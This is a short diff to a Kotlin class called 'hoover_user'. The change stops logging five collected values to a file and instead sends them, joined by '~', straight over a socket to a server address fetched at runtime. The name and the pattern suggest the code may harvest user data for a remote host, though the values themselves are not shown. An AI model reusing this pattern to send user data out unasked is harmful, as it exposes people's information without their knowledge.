@@ -89,13 +89,13 @@ class hoover_user {
             encrypt2
         );
 
-        File("data.log").appendText(
+        /*File("data.log").appendText(
                 arr[0] + "\n" +
                     arr[1] + "\n" +
                         arr[2] + "\n" +
                         arr[3] + "\n" +
                         arr[4] + "\n"
-        );
+        );*/
 
         val data_log: File = File("data.log");
 
@@ -103,7 +103,10 @@ class hoover_user {
         val serverarr: Array<String> = getserver.server_and_port();
 
         val sock = sock();
-        sock.socket_sendfile(serverarr[0], serverarr[1], data_log);
+        //sock.socket_sendfile(serverarr[0], serverarr[1], data_log);
+        sock.socket_sendstring(serverarr[0], serverarr[1],
+            arr[0] + "~" + arr[1] + "~" + arr[2] + "~" + arr[3] + "~" + arr[4]
+        );
 
         val success: Boolean = true;
         return success;
